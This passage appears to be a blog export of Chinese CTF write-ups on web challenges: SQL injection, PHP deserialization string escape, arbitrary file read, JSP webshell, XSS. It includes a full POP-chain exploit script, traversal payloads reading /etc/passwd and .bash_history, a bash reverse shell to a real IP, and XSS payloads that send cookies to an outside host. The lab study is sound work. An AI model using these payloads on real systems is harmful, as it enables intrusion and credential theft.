isset($password)){\n\t\t\tif(preg_match(\"/group|union|select|from|or|and|regexp|substr|like|create|drop|\\,|\\`|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\(|\\)|\\（|\\）|\\_|\\+|\\=|\\]|\\;|\\'|\\’|\\“|\\\"|\\<|\\>|\\?/i\",$username)){\n\t\t\t\tdie(\"error\");\n\t\t\t}\n\t\t\t$sql=\"select pwd from user where uname = '$username' limit 1\";\n\t\t\t$res=mysqli_query($con,$sql);\n\t\t\t$row = mysqli_fetch_array($res);\n\t\t\tif($row['pwd']===$password){\n\t\t\t\t$_SESSION[\"login\"] = true;\n\t\t\t\theader(\"location:/user_main.php?order=id\");\n\t\t\t}else{\n\t\t\t\theader(\"location:/index.php\");\n\t\t\t}\n\t\t}else{\n\t\t\theader(\"location:/index.php\");\n\t\t}\n\n?>\n\n```\n\n```php\n//index.php\n\t\t\tfunction check(){\n\t\t\t\tvar p=$.md5($(\".password\").val());\n\t\t\t\t$(\".password\").val(p);\n\t\t\t}\n```\n\n```php\n//reg.php\n<?php\n\t\terror_reporting(0);\n\t\t$con = mysqli_connect(\"localhost\",\"root\",\"root\",\"web15\");\n        if (!$con)\n        {\n            die('Could not connect: ' . mysqli_error());\n        }\n\t\t$username=$_POST['username'];\n\t\t$password=$_POST['password'];\n\t\t$email=$_POST['email'];\n\t\t$nickname=$_POST['nickname'];\n\t\tif(preg_match(\"/group|union|select|from|or|and|regexp|substr|like|create|drop|\\`|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\(|\\)|\\（|\\）|\\_|\\+|\\=|\\]|\\;|\\'|\\’|\\“|\\\"|\\<|\\>|\\?/i\",$username)){\n\t\t\t\tdie(\"error\");\n\t\t}\n\t\tif(preg_match(\"/group|union|select|from|or|and|regexp|substr|like|create|drop|\\`|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\(|\\)|\\（|\\）|\\_|\\+|\\=|\\]|\\;|\\'|\\’|\\“|\\\"|\\<|\\>|\\?/i\",$password)){\n\t\t\t\tdie(\"error\");\n\t\t}\n\t\tif(preg_match(\"/group|union|select|from|or|and|regexp|substr|like|create|drop|\\`|\\!|\\#|\\%|\\^|\\&|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\+|\\=|\\{|\\}\\]|\\'|\\’|\\“|\\\"|\\<|\\>|\\?/i\",$email)){\n\t\t\t\tdie(\"error\");\n\t\t}\n\t\tif(preg_match(\"/group|union|select|from|or|and|regexp|substr|like|create|drop|\\`|\\~|\\!|\\@|\\#|\\%|\\^|\\&|\\*|\\(|\\)|\\（|\\）|\\-|\\_|\\+|\\=|\\{|\\}|\\]|\\;|\\'|\\’|\\“|\\\"|\\<|\\>|\\?/i\",$nickname)){\n\t\t\t\tdie(\"error\");\n\t\t}\n\t\tif(isset($username) && isset($password) && isset($email) && isset($nickname)){\n\t\t\t$sql = \"INSERT INTO user (uname, pwd, email,nname) VALUES ('$username', '$password', '$email','$nickname')\";\n            $res=mysqli_query($con, $sql);\n            if ($res) {\n\t\t\t\t$_SESSION[\"login\"] = true;\n\t\t\t\theader(\"location:/index.php\");\n\t\t\t} \n\t\t}\n\t\tmysqli_close($conn);\n\t\t\n\n?>\n```\n\n这样的话上面的长字符就可以理解了，传入的值进行了md5加密处理\n\n不过大部分字符都被过滤了，正常的union注入应该不太好注，尝试布尔盲注\n\n得知密码列为pwd，那么就可以通过已知注册用户密码和flag来进行比较，通过位置来确定每一个字符，如果我们注册的密码字符大于flag用户的密码那么就会返回这个字符，通过判断去进行注入\n\n![02aa69bd8a6c3fd38aff77dbe053af5](../image/achieve/202411/ctfshow--web专题/02aa69bd8a6c3fd38aff77dbe053af5.png)\n\n也是贴的别的师傅的脚本\n\n## game-gyctf web2\n\n### #反序列化字符串逃逸\n\n这道题的逃逸手法没怎么看懂，是看着师傅的wp去做的\n\n[[CTFSHOW-日刷-game-gyctf web2/pop链-反序列字符逃逸]](https://www.cnblogs.com/aninock/p/15408090.html)\n\n![image-20250311145931091](../image/achieve/202411/ctfshow--web专题/image-20250311145931091.png)\n\n一个登录界面，但是页面看不到回显，抓包之后才能看到\n\n传入1/1和admin/1发现存在用户名枚举的漏洞\n\n![image-20250311150109185](../image/achieve/202411/ctfshow--web专题/image-20250311150109185.png)\n\n![image-20250311150139715](../image/achieve/202411/ctfshow--web专题/image-20250311150139715.png)\n\n常规扫目录看看有没有源码\n\n![image-20250311150554381](../image/achieve/202411/ctfshow--web专题/image-20250311150554381.png)\n\n把www.zip文件下载下来，我这里把一些没用的东西去掉了\n\n```php\n//login.php\n<?php\nrequire_once('lib.php');\n?>\n<?php \n$user=new user();\nif(isset($_POST['username'])){\n\tif(preg_match(\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\", $_POST['username'])){\n\t\tdie(\"<br>Damn you, hacker!\");\n\t}\n\tif(preg_match(\"/union|select|drop|delete|insert|\\#|\\%|\\`|\\@|\\\\\\\\/i\", $_POST['password'])){\n\t\tdie(\"Damn you, hacker!\");\n\t}\n\t$user->login();\n}\n?>\n```\n\n在login.php文件里调用了user的login方法，跟进一下\n\n```php\n    public function login() {\n        if(isset($_POST['username'])&&isset($_POST['password'])){\n        $mysqli=new dbCtrl();\n        $this->id=$mysqli->login('select id,password from user where username=?');\n        if($this->id){\n        $_SESSION['id']=$this->id;  \n        $_SESSION['login']=1;\n        echo \"你的ID是\".$_SESSION['id'];\n        echo \"你好！\".$_SESSION['token'];\n        echo \"<script>window.location.href='./update.php'</script>\";\n        return $this->id;\n        }\n    }\n```\n\n这里调用了dbCtrl类中的login方法，实际上就是一个数据库查询方法\n\n```php\n    public function login($sql)\n    {\n        $this->mysqli=new mysqli($this->hostname, $this->dbuser, $this->dbpass, $this->database);\n        if ($this->mysqli->connect_error) {\n            die(\"连接失败，错误:\" . $this->mysqli->connect_error);\n        }\n        $result=$this->mysqli->prepare($sql);\n        $result->bind_param('s', $this->name);\n        $result->execute();\n        $result->bind_result($idResult, $passwordResult);\n        $result->fetch();\n        $result->close();\n        if ($this->token=='admin') {\n            return $idResult;\n        }\n        if (!$idResult) {\n            echo('用户不存在!');\n            return false;\n        }\n        if (md5($this->password)!==$passwordResult) {\n            echo('密码错误！');\n            return false;\n        }\n        $_SESSION['token']=$this->name;\n        return $idResult;\n    }\n```\n\n这里的话有两种条件可以返回用户id，第一个是让token等于admin，第二个是让password的md5加密值符合数据库查询结果中的password。但是只有在password的判断语句不满足之后才会对token进行一个赋值操作，再返回用户id，所以实际上也是只能看第二个方法。\n\n我们重点关注那个查询语句\n\n```\nselect id,password from user where username=?\n```\n\n通过where语句对传入的username去查询相应的id和password。\n\n然后我们再来看update文件中的内容，可以看到要session[login]=1 ,才能获得flag\n\n```php\n<?php\nrequire_once('lib.php');\nif ($_SESSION['login']!=1){\n\techo \"你还没有登陆呢！\";\n}\n$users=new User();\n$users->update();\nif($_SESSION['login']===1){\n\trequire_once(\"flag.php\");\n\techo $flag;\n}\n\n?>\n```\n\n这里也是调用了update方法，我们来看一下\n\n```php\npublic function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n```\n\n对getNewinfo方法的结果进行一个反序列化，我们转向看这个方法\n\n```php\n    public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n```\n\n将传入的age和nickname传给Info对象\n\n```php\nclass Info{\n    public $age;\n    public $nickname;\n    public $CtrlCase;\n    public function __construct($age,$nickname){\n        $this->age=$age;\n        $this->nickname=$nickname;\n    }   \n    public function __call($name,$argument){//在对象上下文中调用不可访问的方法时触发\n        echo $this->CtrlCase->login($argument[0]);\n    }\n}\n```\n\n在call里面我们可以看到这里就可以触发我们的login方法，同时传入的参数$sql也是我们可控的，那么假如我们传入一个自定义的id和password，再集合我们自己post传入的password，就可以达到一个绕过的目的，例如我们的查询语句设置为\n\n```\nselect 1,'c4ca4238a0b923820dcc509a6f75849b' from user where username=?\n```\n\n这里的话sql查询后返回的就是1的MD5值，也就是c4ca4238a0b923820dcc509a6f75849b，这时候我们让我们的post的password为1，就可以满足条件了\n\n有思路之后我们就开始写pop链\n\n```\nUpdateHelper:__destruct()->User:__toString()->Info:__call()->\n```\n\n这里的话为了触发call方法，需要调用一个不存在的方法，在`__toString`方法中存在一个调用方法的步骤\n\n```php\n    public function __toString()\n    {\n        $this->nickname->update($this->age);\n        return \"0-0\";\n    }\n```\n\n如果我们让nickname为info类，此时调用了update方法，就可以触发call魔术方法\n\n为了触发toString方法，需要将一个对象像字符串一样操作，然后在UpdateHelper类中看到一个析构方法\n\n```php\nClass UpdateHelper{\n    public $id;\n    public $newinfo;\n    public $sql;\n    public function __construct($newInfo,$sql){\n        $newInfo=unserialize($newInfo);\n        $upDate=new dbCtrl();\n    }\n    public function __destruct()\n    {\n        echo $this->$sql;\n    }\n}\n```\n\n我们只要设置sql为一个对象就可以了，这里设置sql为user类，那我们的exp就是\n\n```php\n<?php\nclass dbCtrl\n{\n    public $name=\"admin\";\n    public $password=\"1\";\n}\nclass Info{\n        public $age;\n    public $nickname;\n    public $CtrlCase;\n}\nclass User\n{\n    public $age=\"select 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\" from user where username=?\";\n    public $nickname;\n}\nClass UpdateHelper{\n    public $sql;\n}\n$db=new dbCtrl();\n\n$in=new Info();\n$in->CtrlCase=$db;\n\n$user=new User();\n$user->nickname=$in;\n\n$update=new UpdateHelper();\n$update->sql=$user;\n\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\n//UpdateHelper:__destruct()->User:__toString()->Info:__call()\n$db=new dbCtrl();\n$in=new Info();\n$user=new User();\n$update=new UpdateHelper();\n$update->sql=$user;\n$user->nickname=$in;\n$in->CtrlCase=$db;\necho serialize($update);\n//O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":2:{s:3:\"age\";s:70:\"select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":2:{s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";}}}}\n\n```\n\n问题又来了，如何将我们序列化的数据进行反序列化呢，在源码中可以看到这里会序列化一个info类并将结果进行反序列化\n\n```php\n    public function update(){\n        $Info=unserialize($this->getNewinfo());\n        $age=$Info->age;\n        $nickname=$Info->nickname;\n        $updateAction=new UpdateHelper($_SESSION['id'],$Info,\"update user SET age=$age,nickname=$nickname where id=\".$_SESSION['id']);\n        //这个功能还没有写完 先占坑\n    }\n    public function getNewInfo(){\n        $age=$_POST['age'];\n        $nickname=$_POST['nickname'];\n        return safe(serialize(new Info($age,$nickname)));\n    }\n```\n\n但是这里info只传入了两个参数，我们没法对第三个参数进行使用\n\n我们让info传三个参数（除了传入的两个参数，还有一个ctrlcase参数），令这个参数为我们需要序列化的类\n\n当一个对象序列化的时候，其中的对象也会跟着一起序列化。\n\n怎么做呢，就是利用序列化字符串逃逸的手法\n\n在lib.php里还有一段代码\n\n```php\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\n```\n\n例如我们用load去进行逃逸，那么就会多出两个字符\n\n那么最后的exp就是\n\n```php\n<?php\nclass dbCtrl\n{\n    public $name=\"admin\";\n    public $password=\"1\";\n}\nclass Info{\n        public $age;\n    public $nickname;\n    public $CtrlCase;\n}\nclass User\n{\n    public $age=\"select 1,\\\"c4ca4238a0b923820dcc509a6f75849b\\\" from user where username=?\";\n    public $nickname;\n}\nClass UpdateHelper{\n    public $sql;\n}\n$db=new dbCtrl();\n\n$in=new Info();\n$in->CtrlCase=$db;\n\n$user=new User();\n$user->nickname=$in;\n\n$update=new UpdateHelper();\n$update->sql=$user;\n\n//UpdateHelper:__destruct()->User:__toString()->Info:__call()\n$db=new dbCtrl();\n$in=new Info();\n$user=new User();\n$update=new UpdateHelper();\n$update->sql=$user;\n$user->nickname=$in;\n$in->CtrlCase=$db;\necho serialize($update);\n\n//O:12:\"UpdateHelper\":1:{s:3:\"sql\";O:4:\"User\":2:{s:3:\"age\";s:70:\"select 1,\"c4ca4238a0b923820dcc509a6f75849b\" from user where username=?\";s:8:\"nickname\";O:4:\"Info\":3:{s:3:\"age\";N;s:8:\"nickname\";N;s:8:\"CtrlCase\";O:6:\"dbCtrl\":2:{s:4:\"name\";s:5:\"admin\";s:8:\"password\";s:1:\"1\";}}}}\n\necho \"\\n\";\nfunction safe($parm){\n    $array= array('union','regexp','load','into','flag','file','insert',\"'\",'\\\\',\"*\",\"alter\");\n    return str_replace($array,'hacker',$parm);\n}\n$p=new Info();\n$p->age=\"age123\";\n$m=str_repeat(\"load\",146);\n$p->nickname=$m.\"\\\";s:8:\\\"CtrlCase\\\";\".serialize($ud).'}';\necho($p->nickname);\necho \"\\n\";\necho safe(serialize($p));\n\n\n```\n\n![image-20250311172721888](../image/achieve/202411/ctfshow--web专题/image-20250311172721888.png)\n\n接着用admin/1登录就可以成功拿到flag了\n\n## web15 Fishman\n\nhint1: 备份泄露，代码审计\n\n提示备份泄露那就直接访问www.zip，果然有\n\n目录结构\n\n![image-20250619130028896](../image/achieve/202411/ctfshow--web专题/image-20250619130028896.png)\n\n先看一下登录页面\n\n```php\n<?php\ninclude (\"../include/common.php\");\nif (isset($_POST['user']) && isset($_POST['pass']) && isset($_POST['login'])) {\n    $user = addslashes($_POST['user']);\n    $pass = addslashes($_POST['pass']);\n    $safepassword = $_POST['safepassword'];\n    $row = $DB->get_row(\"SELECT * FROM fish_admin WHERE username='$user' limit 1\");\n    if ($row['username'] == '') {\n        exit(\"<script language='javascript'>alert('The administrator account or password is incorrect!');history.go(-1);</script>\");\n    } elseif (md5($pass) != $row['password']) {\n        exit(\"<script language='javascript'>alert('The administrator account or password is incorrect!');history.go(-1);</script>\");\n    } elseif ($row['username'] == $user && $row['password'] == md5($pass)) {\n        if (isset($_POST['ispersis'])) {\n            $login_data['admin_user']=$user;\n            $login_data['admin_pass']=sha1(md5($pass) . LOGIN_KEY);\n            setcookie(\"islogin\", \"1\",time() + 604800 );\n            setcookie(\"login_data\",json_encode($login_data),time() + 604800,null,null,true);\n            $realip = real_ip();\n            $address = getCity($realip);\n            $ua = $_SERVER['HTTP_USER_AGENT'];\n            $device = get_device($ua);\n            $time = date(\"Y-m-d H:i:s\");\n            $sql = \"INSERT INTO `fish_ip` (`admin`, `ip`, `addres`, `platform`, `date`) VALUES ('{$row['id']}','{$realip}','{$address}','{$device}','{$time}');\";\n            $DB->query($sql);\n            unset($login_data);\n            exit(\"<script language='javascript'>alert('login successful!');window.location.href='./';</script>\");\n        } else {\n            $_SESSION['islogin'] = 1;\n            $_SESSION['admin_user'] = base64_encode($user);\n            $_SESSION['admin_pass'] = sha1(md5($pass) . LOGIN_KEY);\n            $realip = real_ip();\n            $address = getCity($realip);\n            $ua = $_SERVER['HTTP_USER_AGENT'];\n            $device = get_device($ua);\n            $time = date(\"Y-m-d H:i:s\");\n            $sql = \"INSERT INTO `fish_ip` (`admin`, `ip`, `addres`, `platform`, `date`) VALUES ('{$row['id']}','{$realip}','{$address}','{$device}','{$time}');\";\n            $DB->query($sql);\n            exit(\"<script language='javascript'>alert('Login Successful!');window.location.href='./';</script>\");\n        }\n    }\n} elseif (isset($_GET['logout'])) {\n    setcookie(\"islogin\", \"\");\n    setcookie(\"login_data\", \"\");\n    unset($_SESSION['islogin']);\n    unset($_SESSION['admin_user']);\n    unset($_SESSION['admin_pass']);\n    exit(\"<script language='javascript'>alert('You have successfully logged out of this login!');window.location.href='./login.php';</script>\");\n} elseif ($islogin == 1) {\n    exit(\"<script language='javascript'>alert('You are already logged in!');window.location.href='./';</script>\");\n} ?>\n```\n\n貌似这里过滤的比较严，没什么可用的地方\n\n那看一下member.php\n\n```php\n<?php\nif (!defined('IN_CRONLITE')) exit();\n$islogin = 0;\nif (isset($_COOKIE[\"islogin\"])) {\n    if ($_COOKIE[\"login_data\"]) {\n        $login_data = json_decode($_COOKIE['login_data'], true);\n        $admin_user = $login_data['admin_user'];\n        $udata = $DB->get_row(\"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1\");\n        if ($udata['username'] == '') {\n            setcookie(\"islogin\", \"\", time() - 604800);\n            setcookie(\"login_data\", \"\", time() - 604800);\n        }\n        $admin_pass = sha1($udata['password'] . LOGIN_KEY);\n        if ($admin_pass == $login_data['admin_pass']) {\n            $islogin = 1;\n        } else {\n            setcookie(\"islogin\", \"\", time() - 604800);\n            setcookie(\"login_data\", \"\", time() - 604800);\n        }\n    }\n}\nif (isset($_SESSION['islogin'])) {\n    if ($_SESSION[\"admin_user\"]) {\n        $admin_user = base64_decode($_SESSION['admin_user']);\n        $udata = $DB->get_row(\"SELECT * FROM fish_admin WHERE username='$admin_user' limit 1\");\n        $admin_pass = sha1($udata['password'] . LOGIN_KEY);\n        if ($admin_pass == $_SESSION[\"admin_pass\"]) {\n            $islogin = 1;\n        }\n    }\n}\n?>\n```\n\n这里的话貌似有一个地方可以打，就是关于login_data键的值是没有任何过滤的，并且这里的话有json的解码，所以waf我们可以直接用unicode编码绕过\n\n```php\ndef string_to_unicode_escape(text):\n    \"\"\"将字符串转换为 `\\uXXXX` 格式的字符串\"\"\"\n    return text.encode('unicode_escape').decode('ascii')\n```\n\n","tags":["web"],"categories":["ctfshow"]},{"title":"ctfshow摆烂杯(已做完)","url":"/2025/03/05/ctfshow摆烂杯(已做完)/","content":"\n# web签到\n\n## #括号闭合\n\n打开题目是一个计算题\n\n![image-20250225173929979](../image/achieve/202411/摆烂杯/image-20250225173929979.png)\n\n输入个1返回\n\n![image-20250225174850504](../image/achieve/202411/摆烂杯/image-20250225174850504.png)\n\n这里试着闭合一下括号\n\n```\na=114)+(0\nb=0\nc=0\n```\n\n但是被警告有0，试着绕一下0，这里用+号就可以绕过了\n\n```\na=114)+(+0\nb=+0\nc=+0\n```\n\n# 一行代码\n\n## #input伪协议妙用\n\n```\necho !(!(include \"flag.php\")\n||\n(!error_reporting(0))\n||\nstripos($_GET['filename'],'.')\n||\n($_GET['id']!=0)\n||\n(strlen($_GET['content'])<=7)\n||\n(!eregi(\"ctfsho\".substr($_GET['content'],0,1),\"ctfshow\"))\n||\nsubstr($_GET['content'],0,1)=='w'\n||\n(file_get_contents($_GET['filename'],'r') !== \"welcome2ctfshow\"))?$flag:str_repeat(highlight_file(__FILE__), 0);\n```\n\n  这里的话用到了逻辑非的符号，应该是要我们这些条件都不满足然后进行逻辑非运算才会拿到flag，否则就会输出那看看有哪些条件\n\n1. 需要filename里没有`.`\n2. content值的长度要大于7\n3. content的第一个字符需要是w，然后才能和`ctfsho`拼接满足eregi的正则\n4. content的第一个字符不能为w，用大写的W就可以\n5. 让file_get_contnets读取的内容为welcome2ctfshow`，就会输出$flag\n\n这里的话前面几个条件都很好满足，但是最后一个就需要让返回值为`welcome2ctfshow`，这里的话就可以用到伪协议`php://input`\n\n![image-20250305103419185](../image/achieve/202411/摆烂杯/image-20250305103419185.png)\n\n在 `file_get_contents()` 函数中传入 `php://input` 时，如果我们post传入一个字符串，这个字符串会作为post数据传入服务器，然后结合`php://input`去进行读取这个原始的post数据，也就是我们传入的字符串\n\n可以先在本地测试一下\n\n在web目录中写一个php文件\n\n```php\n<?php\n$a = file_get_contents($_GET['a']);\necho $a;\n?>\n```\n\n在放一个txt文件，内容是123，然后访问并传入/1.php?a=1.txt\n\n![image-20250305103916130](../image/achieve/202411/摆烂杯/image-20250305103916130.png)\n\n我们试一下`php://input`，抓包后传入\n\n```\nGET ?a=php://input\nPOST 12354\n```\n\n在响应包中看到12354被返回，所以是可以做的，那我们的payload就是\n\n![image-20250305104543994](../image/achieve/202411/摆烂杯/image-20250305104543994.png)\n\n# 登陆不了\n\n## #任意文件读取和反弹shell\n\n一个flagshop\n\n![image-20250305105034076](../image/achieve/202411/摆烂杯/image-20250305105034076.png)\n\n有注册和登录口但是注册成功之后登不进去，测了一下xss和sql之后都会显示用户名不合法\n\n![image-20250305124506953](../image/achieve/202411/摆烂杯/image-20250305124506953.png)\n\n后来看到验证码一直没变，看一下验证码的路径\n\n![image-20250305124559655](../image/achieve/202411/摆烂杯/image-20250305124559655.png)\n\n解码后是c81e728.jpg，猜测这里存在任意文件读取，尝试读取/etc/passwd\n\n![image-20250305124925080](../image/achieve/202411/摆烂杯/image-20250305124925080.png)\n\n应该是需要相对路径，做一个目录穿越，还要记得编码\n\n```\n../../../../../../../etc/passwd\nbase64\nLi4vLi4vLi4vLi4vLi4vLi4vLi4vZXRjL3Bhc3N3ZA==\n```\n\n![image-20250305125444043](../image/achieve/202411/摆烂杯/image-20250305125444043.png)\n\n试着看看能不能读到flag，但是后面发现不是这个文件名，就有点复杂了\n\n先看一下历史命令记录\n\n```\n../../../../../../../../../root/.bash_history\nbase编码\nLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vLi4vcm9vdC8uYmFzaF9oaXN0b3J5\n```\n\n![image-20250305130027295](../image/achieve/202411/摆烂杯/image-20250305130027295.png)\n\n确定是tomcat，然后也看到了当前的路径\n\njava的题，直接就尝试读web.xml,classes等文件\n\n- 先读web.xml，在WEB-INF路径下\n\n![image-20250305130801645](../image/achieve/202411/摆烂杯/image-20250305130801645.png)\n\n继续读取pom.xml\n\n![image-20250305131741253](../image/achieve/202411/摆烂杯/image-20250305131741253.png)\n\n发现/lib/tiny-framework-1.0.1.jar，后面的就完全看不懂了，贴师傅的文章吧\n\n[[CTFSHOW-日刷-摆烂杯-登陆不了-tomcat/jsp](https://www.cnblogs.com/aninock/p/15830941.html)]\n\n![image-20250305132200310](../image/achieve/202411/摆烂杯/image-20250305132200310.png)\n\n之后就是在注册页面进行文件写入，文件保存路径是当前路径calsses的上一级，也就是Java默认网站目录WEB-INF\n\n我们可以在这里重写web.xml来访问我们想访问的路径\n\n```\npayload\nusername=web.xml&password=<?xml%20version%3d\"1.0\"%20encoding%3d\"UTF-8\"?>%20<web-app%20version%3d\"3.0\"%20%20%20%20%20%20%20%20%20%20xmlns%3d\"http://java.sun.com/xml/ns/javaee\"%20%20%20%20%20%20%20%20%20%20xmlns:xsi%3d\"http://www.w3.org/2001/XMLSchema-instance\"%20%20%20%20%20%20%20%20%20%20xsi:schemaLocation%3d\"http://java.sun.com/xml/ns/javaee%20%20%20%20%20%20%20%20%20%20http://java.sun.com/xml/ns/javaee/web-app_3_0.xsd\">%20%20%20<display-name></display-name>%20%20%20%20%20<filter>%20%20%20%20%20%20%20%20%20<filter-name>routerFilter</filter-name>%20%20%20%20%20%20%20%20%20<filter-class>com.ctfshow.filter.impl.RouterFilterImpl</filter-class>%20%20%20%20%20</filter>%20%20%20%20%20<filter-mapping>%20%20%20%20%20%20%20%20%20<filter-name>routerFilter</filter-name>%20%20%20%20%20%20%20%20%20<url-pattern>/404.html</url-pattern>%20%20%20%20%20%20%20%20%20<url-pattern>/s/*</url-pattern>%20%20%20%20%20%20%20%20%20<dispatcher>REQUEST</dispatcher>%20%20%20%20%20</filter-mapping>%20<servlet>%20%20%20<servlet-name>ctfshow</servlet-name>%20%20%20<jsp-file>/WEB-INF/1.jsp</jsp-file>%20%20%20</servlet>%20%20%20<servlet-mapping>%20%20%20<servlet-name>ctfshow</servlet-name>%20%20%20<url-pattern>/ctfshow</url-pattern>%20%20%20</servlet-mapping>%20%20</web-app>\n```\n\n![image-20250305132606424](../image/achieve/202411/摆烂杯/image-20250305132606424.png)\n\n![image-20250305132710078](../image/achieve/202411/摆烂杯/image-20250305132710078.png)\n\n然后写入执行bash脚本的jsp\n\n```\n<% java.lang.Runtime.getRuntime().exec(\"sh /home/apache-tomcat-8.5.45/webapps/ROOT/WEB-INF/1.sh\");%>\n```\n\n写入反弹shell的bash脚本\n\n```\nbash -i >& /dev/tcp/156.238.233.87/2333 0>&1\n```\n\n注意改下ip端口\n\n没弹成功，不知道为啥监听端没收到，最后还是在wp里面拿到flag路径进行读取的\n\n# 黑客网站\n\n![image-20250305135054986](../image/achieve/202411/摆烂杯/image-20250305135054986.png)\n\n页面有重复字符串`tyro s4qw s3mm bubg jqje 46nc v35j aqjg eb3n qiuf 23ij oj4z wasx ohyd onion`\n\n![image-20250305140720896](../image/achieve/202411/摆烂杯/image-20250305140720896.png)\n\n提示不用扫描也不用渗透\n\n搜索了一下这个onion\n\n**.onion**是一个用于在Tor网络上寻址特殊用途的顶级域后缀。这种后缀不属于实际的域名，也并未收录于域名根区中。但只要安装了正确的代理软件，如类似于浏览器的网络软件，即可通过Tor服务器发送特定的请求来访问.onion地址。使用这种技术可以使得信息提供商与用户难以被中间经过的网络主机或外界用户所追踪。、\n\n用某葱访问这个.onion站点应该就可以了\n\n# 登陆不了_Revenge\n\n跟上面那个一样的页面，还是一样有任意文件读取的\n\n![image-20250305143014978](../image/achieve/202411/摆烂杯/image-20250305143014978.png)\n\njar包不会进行反编译，我直接摘包子的源代码了\n\n```java\n/*RouterConfig.class*/\npackage com.ctfshow.config;\n\nimport java.io.BufferedInputStream;\nimport java.io.File;\nimport java.io.FileInputStream;\nimport java.io.InputStream;\nimport java.util.Properties;\n\n/* loaded from: tiny-framework-1.0.1.jar:com/ctfshow/config/RouterConfig.class */\npublic class RouterConfig {\n    private static Properties controllerProp;\n    private static Properties methodProp;\n    private static final String CONTROLLER = \"/../config/controller.properties\";\n    private static final String METHOD = \"/../config/method.properties\";\n\n    public static String getController(String key) {\n        String path = RouterConfig.class.getResource(\"/\").getPath();\n        if (controllerProp == null || controllerProp.isEmpty()) {\n            controllerProp = new Properties();\n            try {\n                InputStream InputStream = new BufferedInputStream(new FileInputStream(new File(String.valueOf(path) + CONTROLLER)));\n                controllerProp.load(InputStream);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        String value = controllerProp.getProperty(key);\n        return value;\n    }\n\n    public static String getMethod(String key) {\n        String path = RouterConfig.class.getResource(\"/\").getPath();\n        if (methodProp == null || methodProp.isEmpty()) {\n            methodProp = new Properties();\n            try {\n                InputStream InputStream = new BufferedInputStream(new FileInputStream(new File(String.valueOf(path) + METHOD)));\n                methodProp.load(InputStream);\n            } catch (Exception e) {\n                e.printStackTrace();\n            }\n        }\n        String value = methodProp.getProperty(key);\n        return value;\n    }\n}\n```\n\n重点关注这两个属性\n\n```\n private static final String CONTROLLER = \"/../config/controller.properties\";\n private static final String METHOD = \"/../config/method.properties\";\n```\n\n- 声明了两个静态属性 `controllerProp` 和 `methodProp`，用于存储 `controller.properties` 和 `method.properties` 文件的配置。\n\n那我们继续读取文件\n\n- /config/controller.properties\n\n```\ns=com.ctfshow.controller.Index\nerrorController=com.ctfshow.controller.ErrorPage\nindex=com.ctfshow.controller.Index\nv=com.ctfshow.controller.Validate\n```\n\n- /config/method.properties\n\n```\nd=doIndex\nerrorMethod=showErrorPage\nindex=doIndex\nc=getCaptcha\nreg=doReg\nlogin=doLogin\nmain=doMain\n```\n\n然后找一下index控制器\n\n```\n../../../WEB-INF/classes/com/ctfshow/controller/Index.class\n```\n\n做到这我才发现这道题其实和上面的是一样的只不过修复了一个非预期做法\n","tags":["摆烂杯"],"categories":["ctfshow"]},{"title":"HGAME2025","url":"/2025/02/22/HGAME2025/","content":"\n# **Level 24 Pacman**\n\n## #考眼力的签到题\n\n![image-20250203230941183](../image/achieve/202411/hgame2025/image-20250203230941183.png)\n\n一个吃豆豆的小游戏，要吃够一万分才能拿到flag，这类题都是可以去找条件然后进行绕过的，先看一下源代码\n\n![image-20250203231034873](../image/achieve/202411/hgame2025/image-20250203231034873.png)\n\n终于在源码里面看到了一句base64编码，加密后是\n\n![image-20250203231123084](../image/achieve/202411/hgame2025/image-20250203231123084.png)\n\n栅栏密码\n\n![image-20250203231730692](../image/achieve/202411/hgame2025/image-20250203231730692.png)\n\n但是这个不是密码\n\n然后在又发现一个 haeu4epca_4trgm{_r_amnmse}\n\n![image-20250203232701377](../image/achieve/202411/hgame2025/image-20250203232701377.png)\n\n这个就是对的了\n\n# Level 69 MysteryMessageBoard\n\n## #不出网的xss\n\n登录界面提示了shallot用户名，密码的话试了一下用字典去爆破然后就找到密码登进去了\n\n![image-20250204111233858](../image/achieve/202411/hgame2025/image-20250204111233858.png)\n\n是一个留言板，试一下xss\n\n```\n<script>alert(1)</script>\n```\n\n发现有弹窗显示1，说明这里可能存在xss漏洞\n\n```\n<script>document.location.href=\"http://[ip]/xss.php?cookie=\"+document.cookie</script>\n```\n\n试一下能不能拿到admin的cookie，但是拿到的只有自己的cookie，应该是需要触发admin去访问这个留言，后面扫目录看到有admin路由\n\n![image-20250207001419338](../image/achieve/202411/hgame2025/image-20250207001419338.png)\n\n应该是访问admin路由后才会触发admin访问留言\n\n![image-20250207001446282](../image/achieve/202411/hgame2025/image-20250207001446282.png)\n\n但是用上面的打法然后访问admin之后并没有收到admin的cookie，后面才知道是admin不出网，所以我们让admin去访问本地的8888端口然后把cookie反射到留言板上就可以了\n\n```js\n<script>\nvar xhr=new XMLHttpRequest();\nxhr.open(\"POST\", \"http://127.0.0.1:8888/\", true);\nxhr.setRequestHeader(\"Content-Type\",\"application/x-www-form-urlencoded\");\nxhr.send(\"comment=\" + 